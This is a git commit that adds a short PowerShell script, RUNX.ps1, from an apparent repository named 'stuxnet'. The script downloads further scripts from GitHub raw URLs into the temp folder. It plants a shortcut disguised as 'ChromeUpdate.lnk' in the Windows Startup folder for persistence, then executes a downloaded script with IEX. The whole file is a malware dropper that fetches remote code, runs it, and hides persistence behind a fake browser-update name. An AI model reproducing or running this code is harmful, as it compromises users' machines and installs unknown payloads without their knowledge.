3ea082e141b4521933ffcd912689f281eaab09ec
Gaxi261 <127938084+Gaxi261@users.noreply.github.com>
2025-03-22 17:14:47 +1100

    Create RUNX.ps1

---
+++ RUNX.ps1
@@ -0,0 +1,10 @@
+$url6 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/Update.ps1"
+$output6 = "$env:TEMP\Update.ps1"
+Invoke-WebRequest -Uri $url6 -OutFile $output6
+$url8 = "https://raw.githubusercontent.com/cia168168/folder/main/ChromeUpdate.lnk"
+$output8 = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
+Invoke-WebRequest -Uri $url8 -OutFile $output8
+$url5 = "https://raw.githubusercontent.com/Gaxi261/stuxnet/refs/heads/main/RUNS.ps1"
+$output5 = "$env:TEMP\RUNS.ps1"
+Invoke-WebRequest -Uri $url5 -OutFile $output5
+IEX (Get-Content $output5 | Out-String)
